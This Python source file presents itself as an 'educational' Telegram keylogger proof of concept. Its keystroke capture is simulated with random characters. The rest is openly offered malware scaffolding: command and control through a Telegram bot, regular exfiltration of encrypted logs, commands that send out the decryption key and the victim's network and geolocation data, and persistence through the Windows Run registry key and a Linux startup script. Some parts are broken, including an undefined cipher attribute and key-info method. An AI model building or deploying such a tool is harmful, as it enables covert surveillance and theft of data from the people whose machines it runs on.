#!/usr/bin/env python3
"""
Educational Security Research Tool - Telegram-Based Keylogger POC
================================================================

EDUCATIONAL PURPOSE ONLY - FOR INTERNSHIP/RESEARCH DEMONSTRATION
This tool demonstrates:
- Cross-platform keystroke capture simulation
- Data encryption with Fernet
- Remote data exfiltration via Telegram
- Remote command and control
- Kill switch implementation

ETHICAL USE ONLY - Use only on systems you own or have explicit permission to test.
"""

import os
from colorama import Fore, Style, init
import pyfiglet

init(autoreset=True)

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # dotenv is optional, but recommended for .env support
import sys
import json
import time
import threading
import datetime
import signal
import random
import string
from pathlib import Path

# Third-party imports
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.backends import default_backend
    import base64
    import hashlib
    import requests
    import socket
    import subprocess
    import psutil
    from pynput import keyboard
except ImportError as e:
    print(f"Missing required dependency: {e}")
    print("Please install: pip install cryptography requests psutil pynput")
    sys.exit(1)

class NetworkInfoCollector:
    """
    Collects network and IP information for educational security research.
    """
    
    def __init__(self):
        self.local_ip = None
        self.external_ip = None
        self.ip_details = {}
        self.network_interfaces = []
    
    def get_local_ip(self):
        """Get the local IP address of the system."""
        try:
            # Get primary local IP
            hostname = socket.gethostname()
            self.local_ip = socket.gethostbyname(hostname)
            
            # Alternative method if above doesn't work
            if self.local_ip.startswith("127."):
                # Connect to remote server to determine local IP
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.connect(("8.8.8.8", 80))
                    self.local_ip = s.getsockname()[0]
            
            return self.local_ip
        except Exception as e:
            print(f"[ERROR] Failed to get local IP: {e}")
            return "Unknown"
    
    def get_external_ip(self):
        """Get the external/public IP address."""
        try:
            # Try multiple IP detection services
            services = [
                "https://httpbin.org/ip",
                "https://api.ipify.org?format=json",
                "https://ipinfo.io/json"
            ]
            
            for service in services:
                try:
                    response = requests.get(service, timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        if 'origin' in data:
                            self.external_ip = data['origin']
                        elif 'ip' in data:
                            self.external_ip = data['ip']
                        else:
                            self.external_ip = list(data.values())[0]
                        break
                except:
                    continue
            
            return self.external_ip or "Unknown"
        except Exception as e:
            print(f"[ERROR] Failed to get external IP: {e}")
            return "Unknown"
    
    def get_ip_geolocation(self, ip_address=None):
        """Get detailed geolocation information for an IP address."""
        try:
            target_ip = ip_address or self.external_ip
            if not target_ip or target_ip == "Unknown":
                return {}
            
            # Use ipinfo.io for geolocation data
            response = requests.get(f"https://ipinfo.io/{target_ip}/json", timeout=10)
            if response.status_code == 200:
                self.ip_details = response.json()
                return self.ip_details
            else:
                return {}
        except Exception as e:
            print(f"[ERROR] Failed to get IP geolocation: {e}")
            return {}
    
    def get_network_interfaces(self):
        """Get information about network interfaces."""
        try:
            interfaces = []
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                interface_info = {
                    'name': interface_name,
                    'addresses': []
                }
                
                for address in interface_addresses:
                    addr_info = {
                        'family': str(address.family),
                        'address': address.address,
                        'netmask': getattr(address, 'netmask', None),
                        'broadcast': getattr(address, 'broadcast', None)
                    }
                    interface_info['addresses'].append(addr_info)
                
                interfaces.append(interface_info)
            
            self.network_interfaces = interfaces
            return interfaces
        except Exception as e:
            print(f"[ERROR] Failed to get network interfaces: {e}")
            return []
    
    def collect_all_info(self):
        """Collect all network and IP information."""
        info = {
            'timestamp': datetime.datetime.now().isoformat(),
            'hostname': socket.gethostname(),
            'local_ip': self.get_local_ip(),
            'external_ip': self.get_external_ip(),
            'network_interfaces': self.get_network_interfaces(),
            'ip_geolocation': self.get_ip_geolocation()
        }
        return info
    
    def format_network_info(self):
        """Format network information for display."""
        info = self.collect_all_info()
        
        text = "🌐 <b>Network Information</b>\n\n"
        text += f"🏠 <b>Hostname:</b> <code>{info['hostname']}</code>\n"
        text += f"🔗 <b>Local IP:</b> <code>{info['local_ip']}</code>\n"
        text += f"🌍 <b>External IP:</b> <code>{info['external_ip']}</code>\n\n"
        
        # IP Geolocation details
        geo = info.get('ip_geolocation', {})
        if geo:
            text += "📍 <b>IP Geolocation Details:</b>\n"
            if 'city' in geo:
                text += f"• <b>City:</b> {geo['city']}\n"
            if 'region' in geo:
                text += f"• <b>Region:</b> {geo['region']}\n"
            if 'country' in geo:
                text += f"• <b>Country:</b> {geo['country']}\n"
            if 'org' in geo:
                text += f"• <b>ISP/Organization:</b> {geo['org']}\n"
            if 'timezone' in geo:
                text += f"• <b>Timezone:</b> {geo['timezone']}\n"
            if 'loc' in geo:
                text += f"• <b>Coordinates:</b> {geo['loc']}\n"
            text += "\n"
        
        # Network interfaces (show main ones only)
        text += "🔌 <b>Network Interfaces:</b>\n"
        for interface in info['network_interfaces'][:3]:  # Limit to first 3
            if any('127.0.0.1' not in addr['address'] for addr in interface['addresses']):
                text += f"• <b>{interface['name']}:</b>\n"
                for addr in interface['addresses'][:2]:  # Limit addresses
                    if '127.0.0.1' not in addr['address']:
                        text += f"  - {addr['address']}\n"
        
        return text

class AdvancedEncryption:
    """
    Advanced encryption system with multiple cipher options for educational demonstration.
    """
    
    CIPHER_TYPES = {
        'FERNET': 'Fernet (AES-128 + HMAC)'
    }
    
    def __init__(self, key_file='encryption.key'):
        self.key_file = key_file
        self.backend = default_backend()
        
        # Initialize Fernet cipher
        self.key = self._get_or_create_fernet_key()
        self.cipher_suite = Fernet(self.key)
    
    def _get_or_create_fernet_key(self):
        """Generate or load Fernet key."""
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            return key
    

    
    def encrypt(self, data):
        """Encrypt data using the selected cipher."""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        return self.cipher_suite.encrypt(data)
    
    def decrypt(self, encrypted_data):
        """Decrypt data using the selected cipher."""
        return self.cipher_suite.decrypt(encrypted_data)
    


class TelegramKeylogger:
    """
    Educational keystroke capture demonstration with advanced encryption and Telegram integration.
    """
    
    def __init__(self):
        # Configuration
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        self.chat_id = os.getenv('TELEGRAM_CHAT_ID')
        self.kill_switch_file = ".kill_telegram_keylogger"
        self.running = False
        
        # Validate Telegram credentials
        if not self.bot_token or not self.chat_id:
            print("[ERROR] Missing Telegram credentials!")
            print("Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables")
            sys.exit(1)
        
        # Initialize encryption
        self.encryption = AdvancedEncryption()
        self.network_info = NetworkInfoCollector()
        
        # Storage for captured keystrokes
        self.keystroke_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Kill switch monitoring
        self.kill_switch_active = False
        
        # Telegram API URLs
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.last_update_id = 0
        
        banner = pyfiglet.figlet_format("Keylogger", font="slant")
        print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
        


        
        # Send initialization message
        self.send_telegram_message(f"🎓 Advanced Educational Keylogger POC Started\n🔐 Encryption: Fernet (AES-128 + HMAC)\n⚠️ For research purposes only")
    

    
    def send_telegram_message(self, message):
        """Send message to Telegram chat."""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=10)
            return response.json()
        except Exception as e:
            print(f"[ERROR] Failed to send Telegram message: {e}")
            return None
    
    def send_telegram_document(self, file_data, filename, caption=""):
        """Send encrypted file to Telegram chat."""
        try:
            url = f"{self.base_url}/sendDocument"
            files = {'document': (filename, file_data)}
            data = {
                'chat_id': self.chat_id,
                'caption': caption
            }
            response = requests.post(url, files=files, data=data, timeout=30)
            return response.json()
        except Exception as e:
            print(f"[ERROR] Failed to send Telegram document: {e}")
            return None
    
    def get_telegram_updates(self):
        """Get updates from Telegram bot."""
        try:
            url = f"{self.base_url}/getUpdates"
            data = {'offset': self.last_update_id + 1, 'timeout': 1}
            response = requests.get(url, params=data, timeout=5)
            return response.json()
        except Exception as e:
            print(f"[ERROR] Failed to get Telegram updates: {e}")
            return None
    
    def process_telegram_commands(self, message):
        """Process commands received from Telegram."""
        text = message.get('text', '').lower()
        
        if text == '/start':
            cipher_list = '\n'.join([f"• {k}: {v}" for k, v in AdvancedEncryption.CIPHER_TYPES.items()])
            self.send_telegram_message(
                "🤖 <b>Advanced Educational Keylogger Bot</b>\n\n"
                "<b>Basic Commands:</b>\n"
                "/status - Get current status\n"
                "/logs - Get encrypted logs\n"
                "/key - Get decryption key\n"
                "/decrypt - Decrypt and view logs\n"
                "/kill - Activate kill switch\n\n"
                "<b>Encryption Commands:</b>\n"
                "/cipher - Show current cipher\n"
                "/ciphers - List all available ciphers\n"
                "/setcipher [type] - Change encryption type\n"
                "/keyinfo - Get detailed key information\n\n"
                "<b>Network Information:</b>\n"
                "/ip - Show IP addresses and location\n"
                "/network - Same as /ip command\n"
                "/ipinfo - Get detailed network info (JSON file)\n\n"
                "/help - Show detailed help"
            )
        
        elif text == '/status':
            status_msg = (
                f"📊 <b>Advanced Keylogger Status</b>\n\n"
                f"🔄 Running: {'✅ Yes' if self.running else '❌ No'}\n"
                f"🛑 Kill Switch: {'🔴 Active' if self.kill_switch_active else '🟢 Inactive'}\n"
                f"🔐 Current Cipher: {AdvancedEncryption.CIPHER_TYPES[self.current_cipher]}\n"
                f"📝 Buffer Size: {len(self.keystroke_buffer)} entries\n"
                f"⏰ Last Update: {datetime.datetime.now().strftime('%H:%M:%S')}"
            )
            self.send_telegram_message(status_msg)
        
        elif text == '/cipher':
            self.send_telegram_message("🔐 <b>Current Encryption</b>\n\nFernet (AES-128 + HMAC)")
        
        elif text == '/ciphers':
            cipher_list = '\n'.join([f"• <code>{k}</code>: {v}" for k, v in AdvancedEncryption.CIPHER_TYPES.items()])
            self.send_telegram_message(f"🔐 <b>Available Encryption Ciphers</b>\n\n{cipher_list}\n\nUse: /setcipher [type]")
        

        
        elif text == '/keyinfo':
            try:
                key_info = self.encryption.get_key_info()
                if key_info['type'] == 'RSA-2048':
                    msg = f"🔑 <b>Key Information</b>\n\n<b>Type:</b> {key_info['type']}\n<b>Algorithm:</b> {key_info['algorithm']}\n\n<b>Public Key:</b>\n<code>{key_info['public_key'][:200]}...</code>"
                else:
                    msg = f"🔑 <b>Key Information</b>\n\n<b>Type:</b> {key_info['type']}\n<b>Algorithm:</b> {key_info['algorithm']}\n\n<b>Key:</b>\n<code>{key_info['key'][:100]}...</code>"
                self.send_telegram_message(msg)
            except Exception as e:
                self.send_telegram_message(f"❌ Error getting key info: {str(e)}")
        
        elif text == '/logs':
            self.send_encrypted_logs()
        
        elif text == '/key':
            try:
                key_info = self.encryption.get_key_info()
                if key_info['type'] == 'RSA-2048':
                    key_msg = (
                        f"🔑 <b>Decryption Key (RSA Private)</b>\n\n"
                        f"<b>Type:</b> {key_info['type']}\n"
                        f"⚠️ Private key is stored locally for security\n"
                        f"Use the private key file for decryption"
                    )
                else:
                    key_msg = (
                        f"🔑 <b>Decryption Key</b>\n\n"
                        f"<b>Type:</b> {key_info['type']}\n"
                        f"<code>{key_info['key']}</code>\n\n"
                        f"⚠️ Keep this key secure!"
                    )
                self.send_telegram_message(key_msg)
            except Exception as e:
                self.send_telegram_message(f"❌ Error getting key: {str(e)}")
        
        elif text == '/decrypt':
            self.send_decrypted_logs()
        
        elif text == '/kill':
            self.send_telegram_message("🛑 Kill switch activated! Shutting down...")
            self.activate_kill_switch()
        
        elif text == '/ip' or text == '/network':
            network_info = self.network_info.format_network_info()
            self.send_telegram_message(network_info)
        
        elif text == '/ipinfo':
            try:
                info = self.network_info.collect_all_info()
                # Send as JSON file for detailed analysis
                json_data = json.dumps(info, indent=2, default=str)
                filename = f"network_info_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                caption = "🌐 Complete Network Information (JSON)"
                self.send_telegram_document(json_data.encode(), filename, caption)
            except Exception as e:
                self.send_telegram_message(f"❌ Error collecting network info: {str(e)}")
        
        elif text == '/help':
            cipher_list = '\n'.join([f"• {v}" for v in AdvancedEncryption.CIPHER_TYPES.values()])
            self.send_telegram_message(
                "📚 <b>Advanced Educational Keylogger Help</b>\n\n"
                "<b>This tool demonstrates:</b>\n"
                "• Keystroke capture simulation\n"
                "• Advanced multi-cipher encryption\n"
                "• Network reconnaissance and IP geolocation\n"
                "• System information gathering\n"
                "• Remote data exfiltration\n"
                "• Command and control via Telegram\n"
                "• Dynamic cipher switching\n\n"
                "<b>Network Commands:</b>\n"
                "• /ip or /network - Show IP and location\n"
                "• /ipinfo - Export network data (JSON)\n\n"
                "<b>Supported Encryption:</b>\n"
                f"{cipher_list}\n\n"
                "⚠️ <b>Educational use only!</b>"
            )
        
        else:
            self.send_telegram_message("❓ Unknown command. Use /help for available commands.")
    
    def send_encrypted_logs(self):
        """Send encrypted logs to Telegram."""
        try:
            with self.buffer_lock:
                if not self.keystroke_buffer:
                    self.send_telegram_message("📝 No logs available yet.")
                    return
                
                # Create encrypted data using current cipher
                json_data = json.dumps(self.keystroke_buffer, indent=2)
                encrypted_data = self.encryption.encrypt(json_data)
                
                # Send as file
    
                filename = f"encrypted_logs_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
                caption = f"🔒 Encrypted logs ({len(self.keystroke_buffer)} entries)\n🔐 Cipher: Fernet (AES-128 + HMAC)"
                
                self.send_telegram_document(encrypted_data, filename, caption)

        
        except Exception as e:
            print(f"[ERROR] Failed to send encrypted logs: {e}")
            self.send_telegram_message(f"❌ Error sending logs: {str(e)}")
    
    def send_decrypted_logs(self):
        """Send decrypted logs to Telegram."""
        try:
            with self.buffer_lock:
                if not self.keystroke_buffer:
                    self.send_telegram_message("📝 No logs available yet.")
                    return
                
                # Format logs for display
                log_text = f"🔓 <b>Decrypted Logs ({len(self.keystroke_buffer)} entries)</b>\n🔐 <b>Cipher:</b> Fernet (AES-128 + HMAC)\n\n"
                
                # Show recent logs (last 20 entries)
                recent_logs = self.keystroke_buffer[-20:]
                for log_entry in recent_logs:
                    timestamp = log_entry['timestamp'].split('T')[1][:8]  # HH:MM:SS
                    key_data = log_entry['key']
                    key_type = log_entry['type']
                    
                    if key_type == 'char':
                        log_text += f"<code>{timestamp}</code> - {key_data}\n"
                    else:
                        log_text += f"<code>{timestamp}</code> - [{key_data}]\n"
                
                if len(self.keystroke_buffer) > 20:
                    log_text += f"\n... and {len(self.keystroke_buffer) - 20} more entries"
                
                # Create a temporary file to send
                filename = f"decrypted_logs_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
                caption = f"🔓 Decrypted logs ({len(self.keystroke_buffer)} entries)\n🔐 Cipher: Fernet (AES-128 + HMAC)"

                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(log_text)
                
                with open(filename, 'rb') as f:
                    self.send_telegram_document(f.read(), filename, caption)
                
                os.remove(filename) # Clean up the temporary file

        except Exception as e:
            print(f"[ERROR] Failed to send decrypted logs: {e}")
            self.send_telegram_message(f"❌ Error decrypting logs: {str(e)}")
    
    def simulate_keystroke_capture(self):
        """
        Simulate keystroke capture for educational demonstration.
        """
        common_keys = list(string.ascii_letters + string.digits + ' ')
        special_keys = ['Enter', 'Space', 'Shift', 'Ctrl', 'Alt', 'Tab', 'Backspace']
        
        keystroke_count = 0
        
        while not self.kill_switch_active and self.running:
            try:
                # Simulate random keystroke
                if random.random() < 0.8:  # 80% chance for regular char
                    key_data = random.choice(common_keys)
                    key_type = 'char'
                else:  # 20% chance for special key
                    key_data = random.choice(special_keys)
                    key_type = 'special'
                
                # Create log entry
                timestamp = datetime.datetime.now().isoformat()
                log_entry = {
                    'timestamp': timestamp,
                    'key': key_data,
                    'type': key_type
                }
                
                # Add to buffer
                with self.buffer_lock:
                    self.keystroke_buffer.append(log_entry)
                
                keystroke_count += 1
                
                # Send logs to Telegram every 25 keystrokes
                if keystroke_count % 25 == 0:
                    threading.Thread(target=self.send_encrypted_logs, daemon=True).start()

                
                # Wait before next simulated keystroke
                time.sleep(random.uniform(1.0, 4.0))  # Random interval between keystrokes
            
            except Exception as e:
                print(f"[ERROR] Keystroke simulation error: {e}")
                break
    
    def monitor_telegram_commands(self):
        """Monitor Telegram for incoming commands."""
        while not self.kill_switch_active:
            try:
                updates = self.get_telegram_updates()
                
                if updates and updates.get('ok'):
                    for update in updates.get('result', []):
                        self.last_update_id = update['update_id']
                        
                        if 'message' in update:
                            message = update['message']
                            if message.get('chat', {}).get('id') == int(self.chat_id):
                                threading.Thread(
                                    target=self.process_telegram_commands,
                                    args=(message,),
                                    daemon=True
                                ).start()
                
                time.sleep(2)  # Check for commands every 2 seconds
            
            except Exception as e:
                print(f"[ERROR] Telegram command monitoring error: {e}")
                time.sleep(5)
    
    def setup_persistence(self):
        """
        Educational demonstration of persistence mechanisms.
        """
        try:
            script_path = os.path.abspath(__file__)
            
            if sys.platform.startswith('win'):
                # Windows: Registry-based persistence (demonstration)
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key_name = "TelegramSecurityTool"
                    
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'python "{script_path}"')
                    winreg.CloseKey(key)

                except Exception as e:
                    print(f"[INFO] Persistence demo failed (expected in sandbox): {e}")
            
            elif sys.platform.startswith('linux'):
                # Linux: Crontab persistence (demonstration)
                home_dir = Path.home()
                startup_script = home_dir / ".telegram_startup.sh"
                
                with open(startup_script, 'w') as f:
                    f.write(f"#!/bin/bash\npython3 {script_path}\n")
                os.chmod(startup_script, 0o755)

        
        except Exception as e:
            print(f"[INFO] Persistence demonstration failed: {e}")
    
    def monitor_kill_switch(self):
        """Monitor for kill switch activation."""
        while not self.kill_switch_active:
            if os.path.exists(self.kill_switch_file):
                print("[INFO] Kill switch file detected - activating shutdown")
                self.activate_kill_switch()
                break
            time.sleep(1)
    
    def activate_kill_switch(self):
        """Activate kill switch for safe termination."""

        self.kill_switch_active = True
        self.running = False
        
        # Send final logs if any
        if self.keystroke_buffer:
            self.send_encrypted_logs()
        
        # Send shutdown notification
        self.send_telegram_message("🛑 Educational Keylogger POC Terminated")
        
        # Clean shutdown

        time.sleep(3)
        os._exit(0)
    
    def start_keylogger(self):
        """Start the keystroke simulation in a separate thread."""
        def keylogger_thread():
            print("[INFO] Starting keystroke simulation")
            
            try:
                self.running = True
                self.simulate_keystroke_capture()
            except Exception as e:
                print(f"[ERROR] Keylogger simulation error: {e}")
                self.running = False
        
        # Start keylogger simulation
        thread = threading.Thread(target=keylogger_thread, daemon=True)
        thread.start()
        
        # Start Telegram command monitoring
        telegram_thread = threading.Thread(target=self.monitor_telegram_commands, daemon=True)
        telegram_thread.start()
        
        # Start kill switch monitor
        kill_switch_thread = threading.Thread(target=self.monitor_kill_switch, daemon=True)
        kill_switch_thread.start()

        # Start hotkey kill switch monitor
        hotkey_kill_switch_thread = threading.Thread(target=self.monitor_hotkey_kill_switch, daemon=True)
        hotkey_kill_switch_thread.start()
    
    def run(self):
        """Main execution method - starts all components."""

        
        # Setup persistence demonstration
        self.setup_persistence()
        
        # Start keylogger
        self.start_keylogger()
        
        # Register signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, lambda s, f: self.activate_kill_switch())
        signal.signal(signal.SIGTERM, lambda s, f: self.activate_kill_switch())
        




        
        try:
            # Keep main thread alive
            while not self.kill_switch_active:
                time.sleep(1)
        except KeyboardInterrupt:
            self.activate_kill_switch()
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
            self.activate_kill_switch()

    def monitor_hotkey_kill_switch(self):
        """Monitor for a specific hotkey combination (Ctrl+Shift+F12) to activate kill switch."""
        current_keys = set()

        def on_press(key):
            try:
                current_keys.add(key)
                if (keyboard.Key.ctrl_l in current_keys or keyboard.Key.ctrl_r in current_keys) and \
                   (keyboard.Key.shift_l in current_keys or keyboard.Key.shift_r in current_keys) and \
                   (keyboard.Key.f12 in current_keys):
                    print("[INFO] Hotkey Ctrl+Shift+F12 detected - activating shutdown")
                    self.activate_kill_switch()
            except Exception as e:
                print(f"[ERROR] Hotkey monitor on_press error: {e}")

        def on_release(key):
            try:
                if key in current_keys:
                    current_keys.remove(key)
            except Exception as e:
                print(f"[ERROR] Hotkey monitor on_release error: {e}")

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

def main():
    """Main entry point for the educational Telegram keylogger POC."""
    # Educational disclaimer
    response = 'yes'
    
    # Initialize and run
    try:
        keylogger = TelegramKeylogger()
        keylogger.run()
    except KeyboardInterrupt:
        print("\n[INFO] Shutting down...")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR]{Style.RESET_ALL} Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()